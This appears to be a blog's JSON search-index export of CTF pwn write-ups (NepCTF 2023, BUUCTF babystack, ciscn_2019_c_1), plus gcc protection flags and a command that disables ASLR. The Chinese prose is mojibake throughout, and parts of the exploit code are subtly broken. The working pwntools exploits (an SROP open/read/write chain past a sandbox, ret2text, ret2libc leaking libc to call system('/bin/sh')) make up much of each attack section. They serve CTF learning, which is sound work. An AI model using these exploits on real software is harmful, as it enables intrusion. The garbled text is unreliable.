GCCç¼–è¯‘æŒ‡ä»¤gccå„ä¿æŠ¤ç¼–è¯‘æŒ‡ä»¤https://blog.csdn.net/tabactivity/article/details/126660974https://zoepla.github.io/2018/04/gcc%E7%9A%84%E7%BC%96%E8%AF%91%E5%85%B3%E4%BA%8E%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E5%BC%80%E5%90%AF%E7%9A%84%E9%80%89%E9%A1%B9/å…¨å¼€ gcc test.c -o test -z noexecstack -z now -fstack-protector -fpie -pie å…¨å…³ gcc test.c -o test -z execstack -z norelro -fno-stack-protector -no-pie sudo sh -c â€œecho 0 &gt; /proc/sys/kernel/randomize_va_spaceâ€å…³é—­ASLRæŠŠ0æ¢æˆ2å°±æ˜¯å¼€å¯ ç¼–è¯‘æ—¶åŠ ä¸Š -m32 å³ç¼–è¯‘æˆ32ä½ç¨‹åº https://blog.csdn.net/Jason_ZhouYetao/article/details/81606358 å…³äºç¬¦å·è¡¨readelf binary -p .comment æˆ– objdump -s --section=.comment binary å¯ä»¥æŸ¥çœ‹ç¨‹åºæˆ–ç¼–è¯‘å™¨ç‰ˆæœ¬ readelfï¼Œobjdumpï¼Œå»ç¬¦å·è¡¨ï¼Œæ¢å¤ç¬¦å·è¡¨ä¸Šé“¾æ¥readelfobjdumpå»ç¬¦å·è¡¨æ¢å¤ç¬¦å·è¡¨ patchelfpatchefå››éƒ¨æ›² ldd binaryåˆ—å‡ºåŠ¨æ€åº“ä¾èµ– strings é¢˜ç›®ç»™çš„libcå | grep ubuntuå¿«é€Ÿæ‰¾åˆ°Libcæ–‡ä»¶å¯¹åº”ç‰ˆæœ¬ ï¼ˆcp æƒ³æ›¿æ¢çš„æ–‡ä»¶åˆ°èµ›é¢˜ç›®å½•ï¼‰ patchelf â€“set-interpreter ./ld-2.27.so ./binaryâ€”â€”â€”â€”â€”â€”â€”â€”â€”å¯¹åº”çš„ldæ–‡ä»¶â€”-pwnæ–‡ä»¶ patchelf â€“replace-needed libc.so.6 ./libc-2.27.so ./binaryâ€”â€”â€”â€”â€”â€”â€”â€”-åŸæœ¬çš„libcâ€”-è¦æ›¿æ¢çš„libcâ€”â€“pwnæ–‡ä»¶ ï¼ˆè‹¥åªç”¨ä¸Šè¿°å‘½ä»¤ç¢°åˆ°å¦‚ä¸‹æŠ¥é”™æ—¶ï¼‰patchelf â€“replace-needed libpthread.so.0 ./libpthread-2.31.so ./binary â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“åŸæœ¬çš„ â€”â€”â€” è¦æ›¿æ¢çš„ Linuxå‘½ä»¤ pwd ï¼šè·å–å½“å‰æ‰€åœ¨ç›®å½•è·¯å¾„realpath file : è·å–æ–‡ä»¶åœ°å€ pip listæŸ¥çœ‹å·²å®‰è£…åŒ…pip show åŒ…å æŸ¥çœ‹åŒ…å®‰è£…è·¯å¾„","categories":[{"name":"tools and tricks","slug":"tools-and-tricks","permalink":"http://lmarch2.github.io/categories/tools-and-tricks/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"http://lmarch2.github.io/tags/pwn/"}]},{"title":"2023NepCTF WP","slug":"2023NepCTF-WP","date":"2023-08-15T03:25:59.095Z","updated":"2024-02-04T06:52:04.983Z","comments":true,"path":"posts/0/","link":"","permalink":"http://lmarch2.github.io/posts/0/","excerpt":"","text":"NepCTF2023 WPçœŸçš„è¶…çº§ç´§å¼ åˆºæ¿€çš„æ¯”èµ›ï¼ï¼æœ‰åšä¸å‡ºé¢˜ç›®å¤œä¸èƒ½å¯çš„ç—›è‹¦ï¼Œä¹Ÿæœ‰å†¥æ€è‹¦æƒ³ä¹‹åçš„è±ç„¶å¼€æœ—ï¼Œç¬¬ä¸€æ¬¡æ„Ÿå—åˆ°äº†ctfæ¯”èµ›çš„ä¹è¶£æ‰€åœ¨ã€‚è™½ç„¶æœ€åçš„æˆç»©åœç•™åœ¨110ï¼Œä¸è¿‡å¯¹äºä¸€ä¸ªåˆå‡ºèŒ…åºçš„èŒæ–°ï¼Œå·²ç»å¾ˆæ»¡è¶³äº†ï¼›å³ä½¿æ¯”èµ›ç»“æŸåæ‰åšå‡ºä¸‰æœˆä¸ƒå’Œæœ€åæ”¾å‡ºçš„ä¸¤ä¸ªpwné¢˜ï¼ˆæŒºæ°”çš„ï¼Œæ—©çŸ¥é“ä¸çœ‹ä¸‡æ¶çš„loginçš„â€¦â€¦ï¼‰ã€‚é‚£å°±ç»™è‡ªå·±ç»§ç»­åŠ æ²¹å§ï¼Œå¸Œæœ›ä¸‹æ¬¡æ¯”èµ›èƒ½æ‹¿åˆ°å±äºè‡ªå·±çš„ä¸€ä»½è£èª‰ï¼ PWNsropä½¿ç”¨ç»å…¸sropæŠ€å·§ï¼Œä½†æ˜¯åœ¨æ­¤åŸºç¡€ä¸ŠåˆåŠ äº†orzï¼Œè§‚å¯Ÿç¨‹åºä¼šå‘ç°ï¼Œèƒ½å¤Ÿè°ƒç”¨sigreturnï¼ˆè°ƒç”¨å·ä¸º0xfï¼‰ï¼Œè€Œä¸”æº¢å‡ºé‡è¶³å¤Ÿå¤§ï¼ˆ0x300ï¼‰ã€‚æ•´ä½“çš„ä¸€ä¸ªæ€è·¯å°±æ˜¯æ„é€ system call chainsï¼Œä¼ªé€ å››ä¸ªæ ˆå¸§ï¼Œåœ¨syscallè¿”å›çš„æ—¶å€™ï¼Œrspä¼šè¿”å›åˆ°å¦ä¸€ä¸ªsigframeï¼Œä»è€Œå®ç°ä¸€ä¸ªåˆä¸€ä¸ªçš„å‡½æ•°è°ƒç”¨ã€‚ å‡ ä¸ªæ³¨æ„ç‚¹ï¼š åˆ©ç”¨pwntoolså†™frameçš„æ—¶å€™å¯¹å„ä¸ªå¯„å­˜å™¨ä¼ å…¥çš„éƒ½æ˜¯åœ°å€ï¼Œä¸èƒ½ç›´æ¥æŠŠå­—ç¬¦ä¸²å†™è¿›å»ï¼ˆä¼šbytes()æŠ¥é”™ åˆ«é—®ä¸ºä»€ä¹ˆæˆ‘çŸ¥é“ï¼‰ è¿”å›æ‰§è¡Œç³»ç»Ÿsyscallçš„æ—¶å€™æ³¨æ„è¿™ä¸ªç¨‹åºåªæœ‰call _systemï¼Œè€Œæ²¡æœ‰ç›´æ¥çš„syscallæ±‡ç¼–æŒ‡ä»¤ï¼Œè€Œè¿›å…¥åˆ°call _systemå•æ­¥è°ƒè¯•å¯ä»¥å‘ç°è¿™ä¸ªè¿‡ç¨‹ä¸­å„ä¸ªå¯„å­˜å™¨çš„å€¼æ˜¯ä¼šå‘ç”Ÿå˜åŒ–çš„ï¼ˆä¸åŒçš„å¯„å­˜å™¨ä¹‹é—´èµ‹å€¼ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ„é€ frameæŒ‡å®šå¯„å­˜å™¨å€¼çš„æ—¶å€™éœ€è¦æ ¹æ®call _systemä¸­çš„æŒ‡ä»¤æ¥è°ƒæ•´frameçš„å„ä¸ªå¯„å­˜å™¨å€¼ï¼Œsigreturnä¹Ÿæ˜¯å¦‚æ­¤ï¼Œæœ‰å…¶ä»–çš„å‘½ä»¤ä¼šæ”¹å˜raxçš„å€¼ï¼Œå› æ­¤éœ€è¦å¤šä¸€ä¸ªpop rdiæ§åˆ¶ä¸€ä¸‹ å„ä¸ªstack_frameéœ€è¦ç²¾å¿ƒæ„é€  å› ä¸ºæ²™ç®±ç¦æ‰äº†execveï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨open,read,writeç»•è¿‡æ²™ç®±ã€‚ï¼ˆä¸€å®šæ³¨æ„è¿™é‡Œè¯»å–æ–‡ä»¶å†…å®¹çš„readç³»ç»Ÿè°ƒç”¨rdiä¼ å‚æ˜¯3ï¼‰ exp from pwn import * context(os='linux', arch='amd64', log_level='debug') context.terminal = ['tmux', 'splitw', '-h'] #p = process(\"./pwn\") p = remote('nepctf.1cepeak.cn',31552) #gdb.attach(p) #syscall = 0x400788 syscall = 0x04005B0 pop_rdi = 0x0000000000400813 sigreturn = p64(pop_rdi)+p64(0xf)+p64(0x400750)+p64(syscall) buf = 0x0601020 # bufåœ°å€ #write frame4 = SigreturnFrame(kernel='amd64') frame4.rdi = constants.SYS_write#rax frame4.rcx = 0x40#rdx frame4.rsi = 1#rdi frame4.rdx = buf#rsi frame4.rip = syscall frame4.rsp = buf#+len(sigreturn+bytes(sigframe)) # è®¾ç½®æ ˆé¡¶æŒ‡é’ˆä½ç½® stack3 = sigreturn+bytes(frame4) #open frame2 = SigreturnFrame(kernel='amd64') frame2.rdi = constants.SYS_open#rax frame2.rcx = 0#rdx frame2.rsi = buf#rdiæ³¨æ„è¿™é‡Œæ˜¯ä¸èƒ½ç›´æ¥ä¼ å­—ç¬¦ä¸²\"flag\"çš„ï¼Œè€Œæ˜¯åº”è¯¥ä¼ åœ°å€ frame2.rip = syscall frame2.rsp = buf+5+len(sigreturn+bytes(frame2)) # è®¾ç½®æ ˆé¡¶æŒ‡é’ˆä½ç½® stack1 = sigreturn+bytes(frame2) #read2 frame3 = SigreturnFrame(kernel='amd64') frame3.rdi = constants.SYS_read#rax frame3.rcx = 0x40#rdx frame3.rsi = 3#rdi frame3.rdx = buf#rsi frame3.rip = syscall frame3.rsp = buf+5+len(stack1+sigreturn+bytes(frame3)) # è®¾ç½®æ ˆé¡¶æŒ‡é’ˆä½ç½® stack2 = sigreturn+bytes(frame3) stack_frame = b\"flag\\x00\"+stack1+stack2+stack3 #stack_frame = sigreturn+bytes(sigframe)+sigreturn+bytes(sframe) #read1 frame = SigreturnFrame(kernel='amd64') frame.rdi = constants.SYS_read#rax frame.rcx = len(stack_frame)#rdx frame.rsi = 0#rdi frame.rdx = buf#rsi frame.rip = syscall frame.rsp = buf+5 # è®¾ç½®æ ˆé¡¶æŒ‡é’ˆä½ç½® print(bytes(frame)) pad = cyclic(0x38) pad += sigreturn + bytes(frame) p.recv() p.send(pad) #pause(1) #gdb.attach(p) p.send(stack_frame) p.interactive() å¯æ¶çš„Loginæ‰¾ä¸å‡ºè·¯å¾„â€¦â€¦ HRP-CHAT-2çœŸçš„æœäº†â€¦.çœŸçš„å°±å·®ä¸€æ­¥ï¼Œä¸‹æ ‡æ²¡å¼„æ¸…æ¥šï¼Œå…¶å®ä¸€ä¸ªä¸ªè¯•éƒ½å¯ä»¥è¯•å‡ºæ¥çš„â€¦. è·å¾—æ”»å‡»åŠ›æœ€é«˜çš„è§’è‰²ï¼ˆéœ€è¦æŠ½å¡å¾—åˆ°ï¼ŒæŠ½å¡çš„æ¬¡æ•°ä¼šå½±å“ä½ çš„ä¸‹æ ‡ï¼‰ é€‰æ‹©æ”»å‡»åŠ›æœ€å¼ºçš„æŠ€èƒ½ï¼Œå‡»è´¥bosså³å¯æ‹¿åˆ°flag HRP-CHAT-3é˜…è¯»æºç  mainå‡½æ•°é‡Œæ‰§è¡Œå­è¿›ç¨‹ï¼Œå´©æºƒè¿›å…¥CMD CMDå‡½æ•° å¯ä»¥æƒ³åˆ°è®©å­è¿›ç¨‹å´©æºƒåï¼Œè¿›å…¥å®‰å…¨æ¨¡å¼æ‹¿flag from pwn import * context(os='linux', arch='amd64') #context(os='linux', arch='amd64', log_level='debug') #context.terminal = ['tmux', 'splitw', '-h'] #p = process(\"./\") p = remote('nepctf.1cepeak.cn',31971) sda = lambda delim,data :p.sendafter(delim,data) sd = lambda data :p.send(data) sea = lambda delim,data :p.sendafter(delim,data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim,data) ru = lambda delims,drop=True :p.recvuntil(delims,drop) uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) lg = lambda name,addr :log.success(name+'='+hex(addr)) ia = lambda :p.interactive() def get_addr64() : return u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00')) def get_addr32() : return u32(p.recvuntil(b'\\xf7')[-4:]) ru(b'help') sl(b'Login\\n') sla('6',b'Login\\n'*0x517) sl(b'\\nSafe_Mode_Key') ia() MISCcheckinä¸€ä¸ªå·åªèƒ½å‘ä¸€æ¬¡ï¼Œç¬¬ä¸€æ¬¡å‘é”™äº†â€¦.ï¼ˆå“­ï¼‰ NepCTF{H4ve_Fun_1N_This_Game} ä¸AIå…±èˆçš„å“ˆå¤«æ›¼å¹´è½»äººå°±è¦å¹´è½»ï¼Œæ­£ç»äººè°è‡ªå·±åšé¢˜å•Š~x GPTç§’äº† import heapq import os class HuffmanNode: def __init__(self, char, freq): self.char = char self.freq = freq self.left = None self.right = None def __lt__(self, other): return self.freq &lt; other.freq def build_huffman_tree(frequencies): heap = [HuffmanNode(char, freq) for char, freq in frequencies.items()] heapq.heapify(heap) while len(heap) > 1: left = heapq.heappop(heap) right = heapq.heappop(heap) merged = HuffmanNode(None, left.freq + right.freq) merged.left = left merged.right = right heapq.heappush(heap, merged) return heap[0] def build_huffman_codes(node, current_code, huffman_codes): if node is None: return if node.char is not None: huffman_codes[node.char] = current_code return build_huffman_codes(node.left, current_code + '0', huffman_codes) build_huffman_codes(node.right, current_code + '1', huffman_codes) def compress(input_file, output_file): with open(input_file, 'rb') as f: data = f.read() frequencies = {} for byte in data: if byte not in frequencies: frequencies[byte] = 0 frequencies[byte] += 1 root = build_huffman_tree(frequencies) huffman_codes = {} build_huffman_codes(root, '', huffman_codes) compressed_data = '' for byte in data: compressed_data += huffman_codes[byte] padding = 8 - len(compressed_data) % 8 compressed_data += '0' * padding with open(output_file, 'wb') as f: # Write frequency information f.write(bytes([len(frequencies)])) for byte, freq in frequencies.items(): f.write(bytes([byte, (freq >> 24) &amp; 0xFF, (freq >> 16) &amp; 0xFF, (freq >> 8) &amp; 0xFF, freq &amp; 0xFF])) # Write compressed data for i in range(0, len(compressed_data), 8): byte = compressed_data[i:i+8] f.write(bytes([int(byte, 2)])) def decompress(compressed_file, decompressed_file): with open(compressed_file, 'rb') as f: # è¯»å–é¢‘ç‡ä¿¡æ¯ num_symbols = int.from_bytes(f.read(1), byteorder='big') frequencies = {} for _ in range(num_symbols): byte, freq1, freq2, freq3, freq4 = f.read(5) freq = (freq1 &lt;&lt; 24) | (freq2 &lt;&lt; 16) | (freq3 &lt;&lt; 8) | freq4 frequencies[byte] = freq # æ„å»ºå“ˆå¤«æ›¼æ ‘ root = build_huffman_tree(frequencies) # è§£å‹ç¼©æ•°æ® current_node = root decompressed_data = bytearray() while True: bit = f.read(1) if not bit: break bit = int.from_bytes(bit, byteorder='big') for i in range(7, -1, -1): if current_node.char is not None: decompressed_data.append(current_node.char) current_node = root if (bit >> i) &amp; 1 == 1: current_node = current_node.right else: current_node = current_node.left # å†™å…¥è§£å‹ç¼©åçš„æ•°æ® with open(decompressed_file, 'wb') as output_f: output_f.write(decompressed_data) if __name__ == \"__main__\": input_file = 'input.txt' compressed_file = 'compressed.bin' decompressed_file = 'decompressed.txt' # è§£å‹ç¼©æ–‡ä»¶ decompress(compressed_file, decompressed_file) codeså„ç§å°è¯•æƒ³è¦ææƒç»“æœæ²¡ä¸€ä¸ªå‡½æ•°æœ‰ç”¨çš„ï¼Œsystem,getenv,mprotectç”šè‡³readç”šè‡³envæœ¬èº«å…¨éƒ½ç¦æ‰äº† åªå¥½ç›´æ¥è¾“å‡ºï¼Œæƒ³åˆ°å‡½æ•°å‚æ•°ä¾æ¬¡å…¥æ ˆï¼Œè€Œenvç¯å¢ƒå˜é‡ä¹Ÿæ˜¯mainå‡½æ•°çš„ä¸€ä¸ªå‚æ•°ï¼Œä»è€Œæƒ³åˆ°åœ¨argcçš„åŸºç¡€ä¸Š++ç§»åŠ¨æŒ‡é’ˆï¼Œæš´åŠ›è¾“å‡ºå¤§é‡æ•°æ®ï¼Œä»ä¸­æ‰¾åˆ°flag #include &lt;stdio.h> int main( int argc, char *argv[]) { for ï¼ˆint i = 0; i&lt; argc; ++i) { for(int j = 0;j&lt;700;++j) printf(\"%d': %s n\", i, argvï¼» i ã€ + j ); } return 0; } ï¼ˆä¼˜é›…ï¼‰ å°å®å¼¹é’¢ç´midéŸ³é¢‘éšå†™ï¼ˆæˆ‘æ€è€ƒvelatoè¿™æ ·çš„éŸ³ç¬¦ç¼–ç¨‹è¯­è¨€å°è¯•äº†å¥½ä¹…æœ€åå‘ç°å°±æ˜¯ä¸ªéšå†™ï¼Ÿï¼Ÿï¼‰ å‰åŠæ®µæ˜¯çŸ­éŸ³ç¬¦å’Œé•¿éŸ³ç¬¦ï¼Œåˆ¤æ–­æ˜¯æ‘©æ–¯ç”µç ï¼Œåé¢çš„æ˜¯ä¸€ä¸²åå…­è¿›åˆ¶æ•°å­— æ‘©æ–¯ç”µç è§£ç å¾—åˆ°tipï¼šyoushouldusethistoxorsomething çœŸï¼Œä¸€å¼€å§‹æ–­å¥æˆäº†this tox or something ï¼ˆç”šè‡³æ‰¾äº†åŠå¤©toxæ˜¯å•¥ï¼‰ æ¥ä¸‹æ¥å¼‚æˆ–å¡äº†å¥½ä¹…ï¼Œæ„£æ˜¯æ²¡æƒ³åˆ°æ˜¯ç”¨è¿™å¥è¯å»å¼‚æˆ– ä¹‹åè”æƒ³å‰å‡ ä¸ªå­—æ¯æ˜¯NepCTFï¼Œå°è¯•å‘ç°ä¸ä¹‹å¼‚æˆ–çš„æ˜¯youï¼Œæ‰å‘ç°æŠŠyoushouldusethistoxorsomethingè¿™å¥è¯å»å¼‚æˆ–0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17å°±è¡Œäº† é™Œç”Ÿçš„è¯­è¨€ç”±ç»™å‡ºçš„hintå¯çŸ¥æ˜¯å°é­”å¥³å­¦å›­çš„æœˆæ–‡å’Œé¾™è¯­ã€‚ çº¯ç²¹çš„ä¿¡æ¯æ”¶é›†äº† NepCTF{NEPNEP_A_BELIEVING_Heart_is_your_magic} ConnectedFiveçœŸçš„æ˜¯ä¸‹æ£‹ä¸‹å‡ºæ¥çš„ ä½ ä¹Ÿå–œæ¬¢ä¸‰æœˆä¸ƒä¹ˆé¢˜ç›®æ‰€ç»™é™„ä»¶ salt_lenth= 10 key_lenth= 16 iv= 88219bdee9c396eca3c637c0ea436058 #åŸå§‹ivè½¬hexçš„å€¼ ciphertext= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc çœ‹ä¸Šå»æ˜¯AESï¼Œæ ¹æ®é¢˜ç›®ï¼š salt=NepCTF2023 saltç”¨sha256åŠ å¯†åå¾—åˆ°keyï¼Œè§£å¾—sha256ï¼ˆsaltï¼‰= dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009 æˆªå–å‰åå…­ä½ä¸ºkey from Crypto.Cipher import AES key = 'dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009' iv_hex = '88219bdee9c396eca3c637c0ea436058' #åŸå§‹ivè½¬hexçš„å€¼ ciphertext= '''b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc''' # æŠŠhexå€¼è½¬æˆbytes iv = bytes.fromhex(iv_hex) key = bytes.fromhex(key)[:16] ciphertext = bytes.fromhex(ciphertext) aes = AES.new(key, AES.MODE_CBC, iv) plaintext = aes.decrypt(ciphertext) print('plaintext:', plaintext) # plaintext: b'6148523063484d364c793970625763784c6d6c745a3352774c6d4e76625338794d44497a4c7a41334c7a49304c336c5061316858553070554c6e42755a773d3d' base64è§£ç å¾—åˆ°url è§£å‹å‹ç¼©åŒ…å¾— æ‰¾äº†æ‰¾æ˜Ÿé“çš„æ–‡å­— å¯¹æ‰¾å¾—åˆ°flag NepCTF{HRP_aIways_likes_March_7th}","categories":[{"name":"wp","slug":"wp","permalink":"http://lmarch2.github.io/categories/wp/"}],"tags":[{"name":"ctfï¼ŒNepCTF","slug":"ctfï¼ŒNepCTF","permalink":"http://lmarch2.github.io/tags/ctf%EF%BC%8CNepCTF/"}]},{"title":"week6-T1","slug":"week6-T1","date":"2023-04-01T07:43:53.000Z","updated":"2024-01-31T02:37:37.721Z","comments":true,"path":"posts/c63e16b3/","link":"","permalink":"http://lmarch2.github.io/posts/c63e16b3/","excerpt":"Week 6 T1 bjdctf_2020_babystack 2023-02-05WPBUUCTF pwn ç¬¬åä¸€é¢˜è€ƒç‚¹ï¼šret2text","text":"Week 6 T1 bjdctf_2020_babystack 2023-02-05WPBUUCTF pwn ç¬¬åä¸€é¢˜è€ƒç‚¹ï¼šret2text çœç•¥ç¬¬ä¸€æ­¥â€¦â€¦åªå¼€äº†NX __isoc99_scanf(â€œ%dâ€, &amp;nbytes) è®©ç”¨æˆ·è¾“å…¥ä¸‹æ¬¡è¾“å…¥æ—¶æ¥å—çš„æ•°æ®çš„é•¿åº¦ read(0, &amp;buf, (unsigned int)nbytes) ç”¨æˆ·å¯ä»¥æ§åˆ¶é•¿åº¦ï¼Œå®ç°æ ˆæº¢å‡º 0x02æ‰“å¼€IDA æ‰¾åˆ°æœ‰/bin/shæ‰¾åˆ°åé—¨å‡½æ•° bufå ç”¨çš„ç©ºé—´ä¸º0x10 0x03exp from pwn import * p = remote('node4.buuoj.cn',29891) backdoor_addr = 0x4006e6 payload =b 'a' * (0x10+8) + p64(backdoor_addr) p.sendline(b'100') p.sendline(payload) p.interactive() 0x04å‘ç°è¿™æ ·ä¹Ÿä¸é”™ï¼Œäº¤ç»™å·¥å…·æ¥æ‰¾åœ°å€ å˜é‡(unsigned int)nbytesç”¨æˆ·å¯æ§ï¼Œä¸”æ˜¯ä¸ªæ— ç¬¦å·å‡½æ•° å¯ç”¨-1è¿›è¡Œç»•è¿‡ï¼Œè¿™æ ·ç”¨æˆ·å¯è¾“å…¥çš„æ•°æ®é•¿åº¦å°±ååˆ†å·¨å¤§äº† æ¥ç€è°ƒç”¨backdoor()å³å¯getshell from pwn import * #start # r = process(\"../buu/bjdctf_2020_babystack\") r = remote(\"node4.buuoj.cn\",29891) elf = ELF(\"../buu/bjdctf_2020_babystack\") #params backdoor_addr = elf.symbols['backdoor'] #attack r.recvuntil(b\"your name:\") r.sendline(\"-1\") r.recvuntil(b\"name?\") payload = b'M' * (0x10 + 8) + p64(backdoor_addr) r.sendline(payload) r.interactive()","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"week4&&week5-T5","slug":"week4-week5-T5","date":"2023-04-01T07:36:00.000Z","updated":"2024-01-31T02:37:22.424Z","comments":true,"path":"posts/95338453/","link":"","permalink":"http://lmarch2.github.io/posts/95338453/","excerpt":"T5 ciscn_2019_c_1 2023-01-30WPBUUCTF pwn é¢˜è€ƒç‚¹ï¼šæ ˆæº¢å‡º ret2libc3","text":"T5 ciscn_2019_c_1 2023-01-30WPBUUCTF pwn é¢˜è€ƒç‚¹ï¼šæ ˆæº¢å‡º ret2libc3 0x01è¿™ä¸ä¸Šä¸€é¢˜åˆšåšè¿™ç±»ï¼Ÿç›´æ¥æ¨¡ä»¿ä¸€æ‰‹ã€‚ã€‚ã€‚ã€‚file checksec â€”â€” 64-bit å¼€NX 0x02è¿è¡Œä¸€ä¸‹çœ‹çœ‹ å†çœ‹çœ‹IDA ç ”ç©¶äº†åŠå¤©å‘ç°æ˜¯è®©ä½ åŠ è§£å¯†çš„å†çœ‹çœ‹string window æ²¡ç”¨systemå’Œbinshåˆå‘ç°åŠ å¯†å‡½æ•°é‡Œæœ‰getså‡½æ•°ï¼Œå¯æ„æˆæ ˆæº¢å‡º 0x03åˆ†æ æ˜¯ç›¸åŒçš„æ€æƒ³ï¼Œè¿™é‡Œä¸èµ˜è¿°äº†ï¼Œå¤§è‡´æµç¨‹å°±æ˜¯ åˆ©ç”¨ä¸€ä¸ªç¨‹åºå·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°å»æ³„éœ²å®ƒåœ¨ç¨‹åºä¸­çš„åœ°å€ï¼Œç„¶åå–æœ«å°¾3ä¸ªå­—èŠ‚ï¼Œå»æ‰¾åˆ°è¿™ä¸ªç¨‹åºæ‰€ä½¿ç”¨çš„libcçš„ç‰ˆæœ¬ ç”¨åŒä¸€ä¸ªç¨‹åºé‡Œå‡½æ•°çš„åœ°å€-libcé‡Œçš„å‡½æ•°åœ°å€å³å¯å¾—åˆ°åç§»é‡ å¾—åˆ°åç§»é‡åå°±å¯ä»¥æ¨ç®—å‡ºç¨‹åºä¸­å…¶ä»–å‡½æ•°çš„åœ°å€ï¼ŒçŸ¥é“å…¶ä»–å‡½æ•°çš„åœ°å€ä¹‹åå°±å¯ä»¥å»æ‰§è¡Œsystemï¼ˆâ€™/bin/shâ€˜ï¼‰ 0x04å†™exp from pwn import* from LibcSearcher import* p=remote('node4.buuoj.cn',28342) elf=ELF('./ciscn_2019_c_1') main=0x400b28 pop_rdi=0x400c83 ret=0x4006b9 puts_plt=elf.plt['puts'] puts_got=elf.got['puts'] p.sendlineafter('choice!\\n','1') payload='\\0'+'a'*(0x50-1+8) payload+=p64(pop_rdi) payload+=p64(puts_got) payload+=p64(puts_plt) payload+=p64(main) p.sendlineafter('encrypted\\n',payload) p.recvline() p.recvline() puts_addr=u64(r.recvuntil('\\n')[:-1].ljust(8,'\\0')) print hex(puts_addr) libc=LibcSearcher('puts',puts_addr) offset=puts_addr-libc.dump('puts') binsh=offset+libc.dump('str_bin_sh') system=offset+libc.dump('system') p.sendlineafter('choice!\\n','1') payload='\\0'+'a'*(0x50-1+8) payload+=p64(ret) payload+=p64(pop_rdi) payload+=p64(binsh) payload+=p64(system) p.sendlineafter('encrypted\\n',payload) p.interactive() libcsearchçš„githubç½‘å€å®‰è£… git clone https://github.com/lieanu/LibcSearcher.gitcd LibcSearchersudo python setup.py develop è¦†ç›–æ•°æ®payload=bâ€™\\0â€™+bâ€™aâ€™*(0x50-1+8)\\0æ˜¯ä¸ºäº†è®©åŠ å¯†å‡½æ•°çš„ä¸€ä¸ªstrlenå‡½æ•°åœæ­¢ï¼ˆè¿™ä¸ªå‡½æ•°é‡â€˜0â€™ä¼šåœæ­¢ï¼‰ï¼Œä»è€Œç»•è¿‡åŠ å¯†ï¼Œä¿è¯æˆ‘ä»¬æ„é€ çš„ropä¸ä¼šè¢«ç ´åï¼Œbufçš„å¤§å°ä¸º0x50-1æ˜¯å‡å»\\0+8æ˜¯è¦†ç›–rbp è¿™é“é¢˜çš„æ¥æ”¶éå¸¸è®²ç©¶æ³„éœ²åœ°å€æ¥æ”¶æ—¶å…ˆæ˜¯ä¸¤ä¸‹recvline()ï¼ŒåŸå›  recvline()ä¸€æ¬¡æ¥æ”¶åˆ°\\n;ç¬¬ä¸€æ¬¡recvlineåªèƒ½åˆ°Ciphertextï¼›ç¬¬äºŒæ¬¡åªèƒ½æ¥æ”¶åˆ°0aç¬¬ä¸‰æ¬¡çš„recvuntilæ‰å¼€å§‹å¤„ç†æ³„éœ²çš„gotåœ°å€ã€‚å…ˆå¼€ä¸€ä¸‹context_log_lever=â€™debugâ€™ï¼Œæ•´ä½“çœ‹ä¸€ä¸‹ï¼Œ å†è‡ªå·±recvuntilçœ‹èƒ½æ¥æ”¶åˆ°ä»€ä¹ˆå†…å®¹ã€‚ ç„¶åå†ç”¨recvuntil(â€˜\\nâ€™)[:-1].ljust(8,â€™\\0â€™)æ¥èˆå¼ƒæ¥æ”¶åˆ°çš„å­—ç¬¦ä¸²æœ€åçš„â€™\\x0â€™å¹¶å‘å·¦è¡¥é½ è¿˜æœ‰è¿™ä¸€é“é¢˜æ˜¯64ä½çš„ç¨‹åºï¼Œè¿™è¾¹æ¶‰åŠåˆ°64ä½ç¨‹åºå’Œ32ä½ç¨‹åºè¿è¡Œæ—¶çš„åŒºåˆ«äº†32ä½ç¨‹åºè¿è¡Œæ‰§è¡ŒæŒ‡ä»¤çš„æ—¶å€™ç›´æ¥å»å†…å­˜åœ°å€å¯»å€æ‰§è¡Œ64ä½ç¨‹åºåˆ™æ˜¯é€šè¿‡å¯„å­˜å™¨æ¥ä¼ å€ï¼Œå¯„å­˜å™¨å»å†…å­˜å¯»å€ï¼Œæ‰¾åˆ°åœ°å€è¿”å›ç»™ç¨‹åºå› æ­¤è¦ç”¨å¯„å­˜å™¨å­˜å‚ï¼ˆä¸ºä»€ä¹ˆå‘¢ï¼Ÿï¼Ÿè¿˜æ˜¯ä¸ç†è§£å•Šï¼‰ æ³¨æ„æ ˆå¯¹é½è™½ç„¶æˆ‘ä¸æ‡‚ä¸ºä»€ä¹ˆè¦â€¦â€¦ è¿˜æœ‰æœ€åä¸ºä»€ä¹ˆè¿˜è¦å†è¾“ä¸€ä¸ª0å‘¢ï¼Ÿ æä¸æ‡‚äº† æ±‚åŠ© 